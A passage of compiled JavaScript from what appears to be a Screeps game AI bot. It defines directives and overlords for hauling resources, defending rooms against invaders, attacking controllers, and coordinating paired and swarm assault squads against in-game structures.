            this._drops = _.groupBy(drops, drop => drop.resourceType);
        }
        return this._drops;
    }
    get hasDrops() {
        return _.keys(this.drops).length > 0;
    }
    get storeStructure() {
        if (this.pos.isVisible) {
            return this.pos.lookForStructure(STRUCTURE_STORAGE) ||
                this.pos.lookForStructure(STRUCTURE_TERMINAL) ||
                this.pos.lookForStructure(STRUCTURE_NUKER);
        }
        return undefined;
    }
    get store() {
        if (!this._store) {
            // Merge the "storage" of drops with the store of structure
            let store = {};
            if (this.storeStructure) {
                if (isStoreStructure(this.storeStructure)) {
                    store = this.storeStructure.store;
                }
                else {
                    store = { energy: this.storeStructure.energy };
                }
            }
            else {
                store = { energy: 0 };
            }
            // Merge with drops
            for (const resourceType of _.keys(this.drops)) {
                const totalResourceAmount = _.sum(this.drops[resourceType], drop => drop.amount);
                if (store[resourceType]) {
                    store[resourceType] += totalResourceAmount;
                }
                else {
                    store[resourceType] = totalResourceAmount;
                }
            }
            this._store = store;
        }
        return this._store;
    }
    /**
     * Total amount of resources remaining to be transported; cached into memory in case room loses visibility
     */
    get totalResources() {
        if (this.pos.isVisible) {
            this.memory.totalResources = _.sum(this.store); // update total amount remaining
        }
        else {
            if (this.memory.totalResources == undefined) {
                return 1000; // pick some non-zero number so that haulers will spawn
            }
        }
        return this.memory.totalResources;
    }
    init() {
        this.alert(`Haul directive active`);
    }
    run() {
        if (_.sum(this.store) == 0 && this.pos.isVisible) {
            this.remove();
        }
    }
};
DirectiveHaul.directiveName = 'haul';
DirectiveHaul.color = COLOR_YELLOW;
DirectiveHaul.secondaryColor = COLOR_BLUE;
DirectiveHaul = __decorate([
    profile
], DirectiveHaul);

/**
 * [LEGACY] Manually specify targets to be prioritized during a siege
 */
let DirectiveTargetSiege = class DirectiveTargetSiege extends Directive {
    constructor(flag) {
        super(flag);
    }
    spawnMoarOverlords() {
    }
    getTarget() {
        const targetedStructures = this.pos.lookFor(LOOK_STRUCTURES);
        for (const structure of targetedStructures) {
            for (const structureType of AttackStructurePriorities) {
                if (structure.structureType == structureType) {
                    return structure;
                }
            }
        }
    }
    init() {
    }
    run() {
        // Remove the directive once structures have been destroyed
        if (this.pos.isVisible && !this.getTarget()) {
            this.remove();
        }
    }
    visuals() {
        Visualizer.marker(this.pos, { color: 'orange' });
    }
};
DirectiveTargetSiege.directiveName = 'target:siege';
DirectiveTargetSiege.color = COLOR_GREY;
DirectiveTargetSiege.secondaryColor = COLOR_ORANGE;
DirectiveTargetSiege = __decorate([
    profile
], DirectiveTargetSiege);

/**
 * NPC defense overlord: spawns specially-optimized guards as needed to deal with standard NPC invasions
 */
let DefenseNPCOverlord = class DefenseNPCOverlord extends Overlord {
    constructor(directive, priority = OverlordPriority.outpostDefense.guard) {
        super(directive, 'guard', priority);
        this.guards = this.combatZerg(Roles.guardMelee);
    }
    // private reassignIdleGuards(): void {
    //  // Find all idle guards
    //  let idleGuards = _.filter(this.colony.getCreepsByRole('guard'), (guard: Zerg) => !guard.overlord);
    //  // Reassign them all to this flag
    //  for (let guard of idleGuards) {
    //      guard.overlord = this;
    //  }
    //  // Refresh the list of guards
    //  this.guards = this.creeps('guard');
    // }
    findAttackTarget(guard) {
        const targetingDirectives = DirectiveTargetSiege.find(guard.room.flags);
        const targetedStructures = _.compact(_.map(targetingDirectives, directive => directive.getTarget()));
        if (targetedStructures.length > 0) {
            return guard.pos.findClosestByRange(targetedStructures);
        }
        if (guard.room.hostiles.length > 0) {
            const targets = _.filter(guard.room.hostiles, hostile => hostile.pos.rangeToEdge > 0);
            return guard.pos.findClosestByRange(targets);
        }
        if (guard.room.hostileStructures.length > 0) {
            const haulFlags = _.filter(guard.room.flags, flag => DirectiveHaul.filter(flag));
            if (haulFlags.length == 0) {
                return guard.pos.findClosestByRange(guard.room.hostileStructures);
            }
        }
    }
    /* Attack and chase the specified target */
    combatActions(guard, target) {
        // Attack the target if you can, else move to get in range
        guard.attackAndChase(target);
        // Heal yourself if it won't interfere with attacking
        guard.healSelfIfPossible();
    }
    handleGuard(guard) {
        if (!guard.inSameRoomAs(this) || guard.pos.isEdge) {
            // Move into the assigned room if there is a guard flag present
            guard.goToRoom(this.pos.roomName);
        }
        else { // If you're in the assigned room or if there is no assignment, try to attack or heal
            const attackTarget = this.findAttackTarget(guard);
            if (attackTarget) {
                this.combatActions(guard, attackTarget);
            }
            else {
                guard.doMedicActions(this.pos.roomName);
            }
        }
    }
    init() {
        const amount = this.room && (this.room.invaders.length > 0 || RoomIntel.isInvasionLikely(this.room)) ? 1 : 0;
        this.wishlist(amount, CombatSetups.broodlings.default, { reassignIdle: true });
    }
    run() {
        for (const guard of this.guards) {
            // Run the creep if it has a task given to it by something else; otherwise, proceed with non-task actions
            if (guard.hasValidTask) {
                guard.run();
            }
            else {
                this.handleGuard(guard);
            }
        }
    }
};
DefenseNPCOverlord.requiredRCL = 3;
DefenseNPCOverlord = __decorate([
    profile
], DefenseNPCOverlord);

/**
 * NPC defense directive for outpost rooms with invaders
 */
let DirectiveGuard = class DirectiveGuard extends Directive {
    constructor(flag) {
        super(flag);
    }
    spawnMoarOverlords() {
        if (this.colony.level >= DefenseNPCOverlord.requiredRCL) {
            // if (this.memory.enhanced || this.name.includes('enhanced')) {
            //  this.overlords.guardPair = new GuardPairOverlord(this);
            // } else {
            this.overlords.guard = new DefenseNPCOverlord(this);
            // }
        }
        else {
            this.overlords.swarmGuard = new GuardSwarmOverlord(this);
        }
    }
    init() {
    }
    run() {
        // If there are no hostiles left in the room...
        if (this.room && this.room.hostiles.length == 0 && this.room.hostileStructures.length == 0) {
            // If everyone's healed up, mark as safe
            if (_.filter(this.room.creeps, creep => creep.hits < creep.hitsMax).length == 0 && !this.memory.safeTick) {
                this.memory.safeTick = Game.time;
            }
            // If has been safe for more than 100 ticks, remove directive
            if (this.memory.safeTick && Game.time - this.memory.safeTick > 100) {
                this.remove();
            }
        }
        else {
            if (this.memory.safeTick) {
                delete this.memory.safeTick;
            }
        }
    }
};
DirectiveGuard.directiveName = 'guard';
DirectiveGuard.color = COLOR_BLUE;
DirectiveGuard.secondaryColor = COLOR_BLUE;
DirectiveGuard = __decorate([
    profile
], DirectiveGuard);

/**
 * Spawns melee defenders to defend against incoming player invasions in an owned room
 */
let MeleeDefenseOverlord = class MeleeDefenseOverlord extends CombatOverlord {
    constructor(directive, boosted = false, priority = OverlordPriority.defense.meleeDefense) {
        super(directive, 'meleeDefense', priority, 1);
        this.zerglings = this.combatZerg(Roles.melee, {
            boostWishlist: boosted ? [boostResources.tough[3], boostResources.attack[3], boostResources.move[3]]
                : undefined
        });
    }
    handleDefender(zergling) {
        if (zergling.room.hostiles.length > 0) {
            zergling.autoCombat(zergling.room.name);
        }
    }
    computeNeededZerglingAmount(setup, boostMultiplier) {
        const healAmount = CombatIntel.maxHealingByCreeps(this.room.hostiles);
        const zerglingDamage = ATTACK_POWER * boostMultiplier * setup.getBodyPotential(ATTACK, this.colony);
        const towerDamage = this.room.hostiles[0] ? CombatIntel.towerDamageAtPos(this.room.hostiles[0].pos) || 0 : 0;
        const worstDamageMultiplier = _.min(_.map(this.room.hostiles, creep => CombatIntel.minimumDamageTakenMultiplier(creep)));
        return Math.ceil(.5 + 1.5 * healAmount / (worstDamageMultiplier * (zerglingDamage + towerDamage + 1)));
    }
    init() {
        this.reassignIdleCreeps(Roles.melee);
        if (this.canBoostSetup(CombatSetups.zerglings.boosted_T3_defense)) {
            const setup = CombatSetups.zerglings.boosted_T3_defense;
            this.wishlist(this.computeNeededZerglingAmount(setup, BOOSTS.attack.XUH2O.attack), setup);
        }
        else {
            const setup = CombatSetups.zerglings.default;
            this.wishlist(this.computeNeededZerglingAmount(setup, 1), setup);
        }
    }
    run() {
        this.autoRun(this.zerglings, zergling => this.handleDefender(zergling));
    }
};
MeleeDefenseOverlord.settings = {
    retreatHitsPercent: 0.75,
    reengageHitsPercent: 0.95,
};
MeleeDefenseOverlord = __decorate([
    profile
], MeleeDefenseOverlord);

/**
 * Spawns ranged defenders to defend against incoming player invasions in an owned room
 */
let RangedDefenseOverlord = class RangedDefenseOverlord extends CombatOverlord {
    constructor(directive, boosted = false, priority = OverlordPriority.defense.rangedDefense) {
        super(directive, 'rangedDefense', priority, 1);
        this.hydralisks = this.combatZerg(Roles.ranged, {
            boostWishlist: boosted ? [boostResources.ranged_attack[3], boostResources.heal[3], boostResources.move[3]]
                : undefined
        });
    }
    handleDefender(hydralisk) {
        if (this.room.hostiles.length > 0) {
            hydralisk.autoCombat(this.room.name);
        }
        else {
            hydralisk.doMedicActions(this.room.name);
        }
    }
    computeNeededHydraliskAmount(setup, boostMultiplier) {
        const healAmount = CombatIntel.maxHealingByCreeps(this.room.hostiles);
        const hydraliskDamage = RANGED_ATTACK_POWER * boostMultiplier
            * setup.getBodyPotential(RANGED_ATTACK, this.colony);
        const towerDamage = this.room.hostiles[0] ? CombatIntel.towerDamageAtPos(this.room.hostiles[0].pos) || 0 : 0;
        const worstDamageMultiplier = _.min(_.map(this.room.hostiles, creep => CombatIntel.minimumDamageTakenMultiplier(creep)));
        return Math.ceil(.5 + 1.5 * healAmount / (worstDamageMultiplier * (hydraliskDamage + towerDamage + 1)));
    }
    init() {
        this.reassignIdleCreeps(Roles.ranged);
        if (this.canBoostSetup(CombatSetups.hydralisks.boosted_T3)) {
            const setup = CombatSetups.hydralisks.boosted_T3;
            this.wishlist(this.computeNeededHydraliskAmount(setup, BOOSTS.ranged_attack.XKHO2.rangedAttack), setup);
        }
        else {
            const setup = CombatSetups.hydralisks.default;
            this.wishlist(this.computeNeededHydraliskAmount(setup, 1), setup);
        }
    }
    run() {
        this.autoRun(this.hydralisks, hydralisk => this.handleDefender(hydralisk));
    }
};
RangedDefenseOverlord.settings = {
    retreatHitsPercent: 0.85,
    reengageHitsPercent: 0.95,
};
RangedDefenseOverlord = __decorate([
    profile
], RangedDefenseOverlord);

/**
 * Defend an owned room against an incoming player invasion
 */
let DirectiveInvasionDefense = class DirectiveInvasionDefense extends Directive {
    constructor(flag) {
        super(flag, colony => colony.level >= 1 && colony.spawns.length > 0);
    }
    spawnMoarOverlords() {
        if (!this.room) {
            return;
        }
        const expectedDamage = CombatIntel.maxDamageByCreeps(this.room.dangerousHostiles);
        const useBoosts = (expectedDamage > ATTACK_POWER * 75)
            && !!this.colony.terminal
            && !!this.colony.evolutionChamber;
        const percentWalls = _.filter(this.room.barriers, s => s.structureType == STRUCTURE_WALL).length /
            this.room.barriers.length;
        const meleeHostiles = _.filter(this.room.hostiles, hostile => hostile.getActiveBodyparts(ATTACK) > 0 ||
            hostile.getActiveBodyparts(WORK) > 0);
        const rangedHostiles = _.filter(this.room.hostiles, hostile => hostile.getActiveBodyparts(RANGED_ATTACK) > 0);
        if (this.colony.stage > ColonyStage.Larva) {
            this.overlords.rangedDefense = new RangedDefenseOverlord(this, useBoosts);
        }
        else {
            this.overlords.meleeDefense = new MeleeDefenseOverlord(this, useBoosts);
        }
    }
    init() {
        const numHostiles = this.room ? this.room.hostiles.length.toString() : '???';
        this.alert(`Invasion (hostiles: ${numHostiles})`, NotifierPriority.Critical);
    }
    run() {
        if (!this.room || this.room.hostiles.length > 0) {
            this.memory.safeSince = Game.time;
        }
        // If there are no hostiles left in the room and everyone's healed, then remove the flag
        if (this.room && this.room.hostiles.length == 0 &&
            Game.time - this.memory.safeSince > 100 && this.room.hostileStructures.length == 0) {
            if (_.filter(this.room.creeps, creep => creep.hits < creep.hitsMax).length == 0) {
                this.remove();
            }
        }
    }
};
DirectiveInvasionDefense.directiveName = 'invasionDefense';
DirectiveInvasionDefense.color = COLOR_BLUE;
DirectiveInvasionDefense.secondaryColor = COLOR_PURPLE;
DirectiveInvasionDefense = __decorate([
    profile
], DirectiveInvasionDefense);

/**
 * General purpose skirmishing overlord for dealing with player combat in an outpost
 */
let OutpostDefenseOverlord = class OutpostDefenseOverlord extends CombatOverlord {
    constructor(directive, priority = OverlordPriority.outpostDefense.outpostDefense) {
        super(directive, 'outpostDefense', priority, 1);
        this.spawnGroup.settings.flexibleEnergy = true;
        this.broodlings = this.combatZerg(Roles.guardMelee);
        this.hydralisks = this.combatZerg(Roles.ranged);
        this.healers = this.combatZerg(Roles.healer);
    }
    handleCombat(zerg) {
        if (this.room && this.room.hostiles.length == 0) {
            zerg.doMedicActions(this.room.name);
        }
        else {
            zerg.autoSkirmish(this.pos.roomName);
        }
    }
    handleHealer(healer) {
        if (CombatIntel.isHealer(healer) && healer.getActiveBodyparts(HEAL) == 0) {
            if (this.colony.towers.length > 0) {
                healer.goToRoom(this.colony.room.name); // go get healed
            }
            else {
                healer.suicide(); // you're useless at this point // TODO: this isn't smart
            }
        }
        else {
            if (this.room && _.any([...this.broodlings, ...this.hydralisks], creep => creep.room == this.room)) {
                this.handleCombat(healer); // go to room if there are any fighters in there
            }
            else {
                healer.autoSkirmish(healer.room.name);
            }
        }
    }
    computeNeededHydraliskAmount(setup, enemyRangedPotential) {
        const hydraliskPotential = setup.getBodyPotential(RANGED_ATTACK, this.colony);
        // TODO: body potential from spawnGroup energy?
        // let worstDamageMultiplier = CombatIntel.minimumDamageMultiplierForGroup(this.room.hostiles);
        return Math.ceil(1.5 * enemyRangedPotential / hydraliskPotential);
    }
    // TODO: division by 0 error!
    computeNeededBroodlingAmount(setup, enemyAttackPotential) {
        const broodlingPotential = setup.getBodyPotential(ATTACK, this.colony);
        // let worstDamageMultiplier = CombatIntel.minimumDamageMultiplierForGroup(this.room.hostiles);
        return Math.ceil(1.5 * enemyAttackPotential / broodlingPotential);
    }
    computeNeededHealerAmount(setup, enemyHealPotential) {
        const healerPotential = setup.getBodyPotential(HEAL, this.colony);
        return Math.ceil(1.5 * enemyHealPotential / healerPotential);
    }
    getEnemyPotentials() {
        if (this.room) {
            return CombatIntel.getCombatPotentials(this.room.hostiles);
        }
        else {
            return { attack: 1, rangedAttack: 0, heal: 0, };
        }
    }
    init() {
        const maxCost = Math.max(patternCost(CombatSetups.hydralisks.default), patternCost(CombatSetups.broodlings.default));
        const mode = this.colony.room.energyCapacityAvailable >= maxCost ? 'NORMAL' : 'EARLY';
        const { attack, rangedAttack, heal } = this.getEnemyPotentials();
        const hydraliskSetup = mode == 'NORMAL' ? CombatSetups.hydralisks.default : CombatSetups.hydralisks.early;
        const hydraliskAmount = this.computeNeededHydraliskAmount(hydraliskSetup, rangedAttack);
        this.wishlist(hydraliskAmount, hydraliskSetup, { priority: this.priority - .2, reassignIdle: true });
        const broodlingSetup = mode == 'NORMAL' ? CombatSetups.broodlings.default : CombatSetups.broodlings.early;
        const broodlingAmount = this.computeNeededBroodlingAmount(broodlingSetup, attack);
        this.wishlist(broodlingAmount, broodlingSetup, { priority: this.priority - .1, reassignIdle: true });
        const enemyHealers = _.filter(this.room ? this.room.hostiles : [], creep => CombatIntel.isHealer(creep)).length;
        let healerAmount = (enemyHealers > 0 || mode == 'EARLY') ?
            this.computeNeededHealerAmount(CombatSetups.healers.default, heal) : 0;
        if (mode == 'EARLY' && attack + rangedAttack > 0) {
            healerAmount = Math.max(healerAmount, 1);
        }
        this.wishlist(healerAmount, CombatSetups.healers.default, { priority: this.priority, reassignIdle: true });
    }
    run() {
        this.autoRun(this.broodlings, broodling => this.handleCombat(broodling));
        this.autoRun(this.hydralisks, mutalisk => this.handleCombat(mutalisk));
        this.autoRun(this.healers, healer => this.handleHealer(healer));
    }
};
OutpostDefenseOverlord = __decorate([
    profile
], OutpostDefenseOverlord);

/**
 * Defend an outpost against an incoming player invasion
 */
let DirectiveOutpostDefense = class DirectiveOutpostDefense extends Directive {
    constructor(flag) {
        super(flag);
    }
    spawnMoarOverlords() {
        this.overlords.outpostDefense = new OutpostDefenseOverlord(this);
    }
    init() {
        const numHostiles = this.room ? this.room.hostiles.length.toString() : '???';
        this.alert(`Outpost defense (hostiles: ${numHostiles})`, NotifierPriority.High);
    }
    run() {
        if (!this.room || this.room.hostiles.length > 0) {
            this.memory.safeSince = Game.time;
        }
        // If there are no hostiles left in the room and everyone's healed, then remove the flag
        if (this.room && this.room.hostiles.length == 0 &&
            Game.time - this.memory.safeSince > 100 && this.room.hostileStructures.length == 0) {
            if (_.filter(this.room.creeps, creep => creep.hits < creep.hitsMax).length == 0) {
                this.remove();
            }
        }
    }
};
DirectiveOutpostDefense.directiveName = 'outpostDefense';
DirectiveOutpostDefense.color = COLOR_BLUE;
DirectiveOutpostDefense.secondaryColor = COLOR_RED;
DirectiveOutpostDefense = __decorate([
    profile
], DirectiveOutpostDefense);

/**
 * Controller attacker overlord.  Spawn CLAIM creeps to mass up on a controller and attack all at once
 * This module was contributed by @sarrick and has since been modified
 */
let ControllerAttackerOverlord = class ControllerAttackerOverlord extends Overlord {
    constructor(directive, priority = OverlordPriority.offense.controllerAttack) {
        super(directive, 'controllerAttack', priority);
        this.controllerAttackers = this.zerg(Roles.claim);
        this.spawnGroup = new SpawnGroup(this, { requiredRCL: 4 });
        this.refresh();
    }
    refresh() {
        super.refresh();
        if (this.room && this.room.controller) {
            this.attackPositions = this.room.controller.pos.availableNeighbors(true);
            this.readyTick = Game.time + (this.room.controller.upgradeBlocked || 0);
        }
        else {
            this.attackPositions = [];
            this.readyTick = Game.time;
        }
        this.assignments = this.getPositionAssignments();
    }
    getPositionAssignments() {
        const assignments = {};
        const maxLoops = Math.min(this.attackPositions.length, this.controllerAttackers.length);
        const controllerAttackers = _.sortBy(this.controllerAttackers, zerg => zerg.name);
        for (let i = 0; i < maxLoops; i++) {
            assignments[controllerAttackers[i].name] = this.attackPositions[i];
        }
        return assignments;
    }
    init() {
        // TODO: Prespawn attackers to arrive as cooldown disappears
        if (this.attackPositions.length > 0 && Game.time >= this.readyTick) {
            this.wishlist(this.attackPositions.length, Setups.infestors.controllerAttacker, { noLifetimeFilter: true });
        }
    }
    run() {
        for (const controllerAttacker of this.controllerAttackers) {
            const attackPos = this.assignments[controllerAttacker.name];
            if (attackPos) {
                controllerAttacker.goTo(attackPos);
            }
            else {
                log.debug(`No attack position for ${controllerAttacker.print}!`);
            }
        }
        if (this.room && this.room.controller && !this.room.controller.upgradeBlocked) {
            if (_.all(this.controllerAttackers, creep => creep.pos.isEqualTo(this.assignments[creep.name]))
                || _.any(this.controllerAttackers, creep => creep.pos.isNearTo(this.room.controller)
                    && (creep.ticksToLive || 10) <= 2)) {
                this.launchAttack();
            }
        }
    }
    launchAttack() {
        let signed = false;
        if (this.room && this.room.controller) {
            for (const infestor of this.controllerAttackers) {
                infestor.attackController(this.room.controller);
                if (!signed) {
                    signed = (infestor.signController(this.room.controller, 'For the swarm') == OK);
                }
            }
        }
    }
};
ControllerAttackerOverlord = __decorate([
    profile
], ControllerAttackerOverlord);

/**
 * Attack a controller, downgrading it to level 0
 */
let DirectiveControllerAttack = class DirectiveControllerAttack extends Directive {
    constructor(flag) {
        super(flag);
    }
    spawnMoarOverlords() {
        this.overlords.scout = new StationaryScoutOverlord(this); // TODO: Not have a scout at all times
        this.overlords.controllerAttack = new ControllerAttackerOverlord(this);
    }
    init() {
        const level = this.room && this.room.controller ? this.room.controller.level.toString() : '???';
        this.alert(`Downgrading controller (RCL${level})`);
    }
    run() {
        if (this.room && this.room.controller && this.room.controller.level == 0) {
            log.notify(`Removing ${this.name} since controller has reached level 0.`);
            this.remove();
        }
    }
};
DirectiveControllerAttack.directiveName = 'controllerAttack';
DirectiveControllerAttack.color = COLOR_RED;
DirectiveControllerAttack.secondaryColor = COLOR_PURPLE;
DirectiveControllerAttack = __decorate([
    profile
], DirectiveControllerAttack);

var PairDestroyerOverlord_1;
/**
 *  Destroyer overlord - spawns attacker/healer pairs for combat within a hostile room
 */
let PairDestroyerOverlord = PairDestroyerOverlord_1 = class PairDestroyerOverlord extends Overlord {
    constructor(directive, priority = OverlordPriority.offense.destroy) {
        super(directive, 'destroy', priority);
        this.directive = directive;
        this.attackers = this.combatZerg(Roles.melee, {
            notifyWhenAttacked: false,
            boostWishlist: [boostResources.attack[3], boostResources.tough[3], boostResources.move[3]]
        });
        this.healers = this.combatZerg(Roles.healer, {
            notifyWhenAttacked: false,
            boostWishlist: [boostResources.heal[3], boostResources.tough[3], boostResources.move[3],]
        });
    }
    findTarget(attacker) {
        if (this.room) {
            // Prioritize specifically targeted structures first
            const targetingDirectives = DirectiveTargetSiege.find(this.room.flags);
            const targetedStructures = _.compact(_.map(targetingDirectives, directive => directive.getTarget()));
            if (targetedStructures.length > 0) {
                return CombatTargeting.findClosestReachable(attacker.pos, targetedStructures);
            }
            else {
                // Target nearby hostile creeps
                const creepTarget = CombatTargeting.findClosestHostile(attacker, true);
                if (creepTarget)
                    return creepTarget;
                // Target nearby hostile structures
                const structureTarget = CombatTargeting.findClosestPrioritizedStructure(attacker);
                if (structureTarget)
                    return structureTarget;
            }
        }
    }
    attackActions(attacker, healer) {
        const target = this.findTarget(attacker);
        if (target) {
            if (attacker.pos.isNearTo(target)) {
                attacker.attack(target);
            }
            else {
                Movement.pairwiseMove(attacker, healer, target);
                attacker.autoMelee();
            }
        }
    }
    handleSquad(attacker) {
        const healer = attacker.findPartner(this.healers);
        // Case 1: you don't have an active healer
        if (!healer || healer.spawning || healer.needsBoosts) {
            // Wait near the colony controller if you don't have a healer
            if (attacker.pos.getMultiRoomRangeTo(this.colony.controller.pos) > 5) {
                attacker.goTo(this.colony.controller, { range: 5 });
            }
            else {
                attacker.park();
            }
        }
        // Case 2: you have an active healer
        else {
            // Activate retreat condition if necessary
            // Handle recovery if low on HP
            if (attacker.needsToRecover(PairDestroyerOverlord_1.settings.retreatHitsPercent) ||
                healer.needsToRecover(PairDestroyerOverlord_1.settings.retreatHitsPercent)) {
                // Healer leads retreat to fallback position
                Movement.pairwiseMove(healer, attacker, CombatIntel.getFallbackFrom(this.directive.pos));
            }
            else {
                // Move to room and then perform attacking actions
                if (!attacker.inSameRoomAs(this)) {
                    Movement.pairwiseMove(attacker, healer, this.pos);
                }
                else {
                    this.attackActions(attacker, healer);
                }
            }
        }
    }
    handleHealer(healer) {
        // If there are no hostiles in the designated room, run medic actions
        if (this.room && this.room.hostiles.length == 0 && this.room.hostileStructures.length == 0) {
            healer.doMedicActions(this.room.name);
            return;
        }
        const attacker = healer.findPartner(this.attackers);
        // Case 1: you don't have an attacker partner
        if (!attacker || attacker.spawning || attacker.needsBoosts) {
            if (healer.hits < healer.hitsMax) {
                healer.heal(healer);
            }
            // Wait near the colony controller if you don't have an attacker
            if (healer.pos.getMultiRoomRangeTo(this.colony.controller.pos) > 5) {
                healer.goTo(this.colony.controller, { range: 5 });
            }
            else {
                healer.park();
            }
        }
        // Case 2: you have an attacker partner
        else {
            if (attacker.hitsMax - attacker.hits > healer.hitsMax - healer.hits) {
                healer.heal(attacker);
            }
            else {
                healer.heal(healer);
            }
        }
    }
    init() {
        let amount;
        if (this.directive.memory.amount) {
            amount = this.directive.memory.amount;
        }
        else {
            amount = 1;
        }
        if (RoomIntel.inSafeMode(this.pos.roomName)) {
            amount = 0;
        }
        const attackerPriority = this.attackers.length < this.healers.length ? this.priority - 0.1 : this.priority + 0.1;
        const attackerSetup = this.canBoostSetup(CombatSetups.zerglings.boosted_T3) ? CombatSetups.zerglings.boosted_T3
            : CombatSetups.zerglings.default;
        this.wishlist(amount, attackerSetup, { priority: attackerPriority });
        const healerPriority = this.healers.length < this.attackers.length ? this.priority - 0.1 : this.priority + 0.1;
        const healerSetup = this.canBoostSetup(CombatSetups.healers.boosted_T3) ? CombatSetups.healers.boosted_T3
            : CombatSetups.healers.default;
        this.wishlist(amount, healerSetup, { priority: healerPriority });
    }
    run() {
        for (const attacker of this.attackers) {
            // Run the creep if it has a task given to it by something else; otherwise, proceed with non-task actions
            if (attacker.hasValidTask) {
                attacker.run();
            }
            else {
                if (attacker.needsBoosts) {
                    this.handleBoosting(attacker);
                }
                else {
                    this.handleSquad(attacker);
                }
            }
        }
        for (const healer of this.healers) {
            if (healer.hasValidTask) {
                healer.run();
            }
            else {
                if (healer.needsBoosts) {
                    this.handleBoosting(healer);
                }
                else {
                    this.handleHealer(healer);
                }
            }
        }
    }
};
PairDestroyerOverlord.settings = {
    retreatHitsPercent: 0.85,
    reengageHitsPercent: 0.95,
};
PairDestroyerOverlord = PairDestroyerOverlord_1 = __decorate([
    profile
], PairDestroyerOverlord);

/**
 * Spawns a pair of attacker/healer creeps to siege a room
 */
let DirectivePairDestroy = class DirectivePairDestroy extends Directive {
    constructor(flag) {
        super(flag);
    }
    spawnMoarOverlords() {
        this.overlords.destroy = new PairDestroyerOverlord(this);
    }
    init() {
        this.alert(`Pair detroyer directive active`);
    }
    run() {
        // If there are no hostiles left in the room then remove the flag and associated healpoint
        if (this.room && this.room.hostiles.length == 0 && this.room.hostileStructures.length == 0) {
            log.notify(`Pair destroyer mission at ${this.pos.roomName} completed successfully.`);
            this.remove();
        }
    }
    visuals() {
        Visualizer.marker(this.pos, { color: 'red' });
        const fallback = CombatIntel.getFallbackFrom(this.pos);
        Visualizer.marker(fallback, { color: 'green' });
    }
};
DirectivePairDestroy.directiveName = 'destroy';
DirectivePairDestroy.color = COLOR_RED;
DirectivePairDestroy.secondaryColor = COLOR_CYAN;
DirectivePairDestroy = __decorate([
    profile
], DirectivePairDestroy);

/**
 * SwarmOverlords extend the base CombatOverlord class, providing additional methods for spawning and controlling swarms
 */
let SwarmOverlord = class SwarmOverlord extends CombatOverlord {
    /* Wishlist of creeps to simplify spawning logic; includes automatic reporting */
    // TODO: at the moment, this assumes that every swarm within an overlord is the same configuration
    swarmWishlist(swarmQuantity, config) {
        // Make tables to log current and needed creep quantities
        const creepQuantities = {};
        const neededQuantities = {};
        // Handle filling out existing swarms first
        const validSwarms = _.filter(this.swarms, swarm => !swarm.isExpired);
        for (const swarm of validSwarms) {
            for (const creepType of config) {
                const { setup, amount } = creepType;
                const priority = creepType.priority || this.priority;
                const existingCreepsOfRole = _.filter(swarm.creeps, creep => creep.roleName == setup.role);
                // Log current and needed amounts for reporting
                if (!creepQuantities[setup.role])
                    creepQuantities[setup.role] = 0;
                creepQuantities[setup.role] += existingCreepsOfRole.length;
                if (!neededQuantities[setup.role])
                    neededQuantities[setup.role] = 0;
                neededQuantities[setup.role] += amount;
                // Spawn the neede quantity of creeps
                const spawnQuantity = amount - existingCreepsOfRole.length;
                for (let i = 0; i < spawnQuantity; i++) {
                    this.requestCreep(setup, { priority: priority });
                }
            }
        }
        // Spawn new swarms as needed
        const numRemainingSwarms = swarmQuantity - validSwarms.length;
        for (let n = 0; n < numRemainingSwarms; n++) {
            for (const creepType of config) {
                const { setup, amount } = creepType;
                const priority = creepType.priority || this.priority;
                if (!neededQuantities[setup.role])
                    neededQuantities[setup.role] = 0;
                neededQuantities[setup.role] += amount;
                for (let i = 0; i < amount; i++) {
                    this.requestCreep(setup, { priority: priority + 0.5 });
                }
            }
        }
        // Report creep amounts
        for (const role of _.keys(neededQuantities)) {
            this.creepReport(role, creepQuantities[role] || 0, neededQuantities[role]);
        }
    }
};
SwarmOverlord = __decorate([
    profile
], SwarmOverlord);

const DEBUG$2 = false;
/**
 * Spawns squads of attackers and healers to siege a hostile room, moving with swarm logic in a coordinated fashion
 */
let SwarmDestroyerOverlord = class SwarmDestroyerOverlord extends SwarmOverlord {
    constructor(directive, priority = OverlordPriority.offense.destroy) {
        super(directive, 'destroy', priority, 8);
        this.directive = directive;
        this.memory = Mem.wrap(this.directive.memory, this.name);
        this.intel = new CombatIntel(this.directive);
        this.zerglings = this.combatZerg(Roles.melee, {
            notifyWhenAttacked: false,
            boostWishlist: [boostResources.attack[3], boostResources.tough[3], boostResources.move[3]]
        });
        // this.hydralisks = this.combatZerg(Roles.ranged, {
        //  notifyWhenAttacked: false,
        //  boostWishlist     : [boostResources.ranged_attack[3], boostResources.tough[3], boostResources.move[3]]
        // });
        this.healers = this.combatZerg(Roles.healer, {
            notifyWhenAttacked: false,
            boostWishlist: [boostResources.heal[3], boostResources.tough[3], boostResources.move[3],]
        });
        // Make swarms
        this.makeSwarms();
        // Compute fallback positions and assembly points
        this.fallback = $.pos(this, 'fallback', () => this.intel.findSwarmAssemblyPointInColony({ width: 2, height: 2 }), 200);
        this.assemblyPoints = [];
        for (let i = 0; i < _.keys(this.swarms).length + 1; i++) {
            this.assemblyPoints.push($.pos(this, `assemble_${i}`, () => this.intel.findSwarmAssemblyPointInColony({ width: 2, height: 2 }, i + 1), 200));
        }
    }
    refresh() {
        super.refresh();
        this.memory = Mem.wrap(this.directive.memory, this.name);
        this.makeSwarms();
    }
    makeSwarms() {
        this.swarms = {};
        const meleeZerg = [...this.zerglings, ...this.healers];
        // let rangedZerg: CombatZerg[] = this.hydralisks;
        const maxPerSwarm = { [Roles.melee]: 2, [Roles.healer]: 2, [Roles.ranged]: 4 };
        const meleeZergBySwarm = _.groupBy(meleeZerg, zerg => zerg.findSwarm(meleeZerg, maxPerSwarm));
        // let rangedZergBySwarm = _.groupBy(rangedZerg, zerg => zerg.findSwarm(rangedZerg, maxPerSwarm));
        // let zergBySwarm = _.merge(meleeZergBySwarm, rangedZergBySwarm);
        for (const ref in meleeZergBySwarm) {
            if (ref != undefined) {
                if (DEBUG$2)
                    log.debug(`Making swarm for ${_.map(meleeZergBySwarm[ref], z => z.name)}`);
                this.swarms[ref] = new Swarm(this, ref, meleeZergBySwarm[ref]);
            }
        }
        // for (let ref in rangedZergBySwarm) { // todo: finish changing
        //  if (ref != undefined) {
        //      if (DEBUG) log.debug(`Making swarm for ${_.map(meleeZergBySwarm[ref], z => z.name)}`);
        //      this.swarms[ref] = new Swarm(this, ref, meleeZergBySwarm[ref]);
        //  }
        // }
    }
    handleSwarm(swarm, index, waypoint = this.directive.pos) {
        // Swarm initially groups up at fallback location
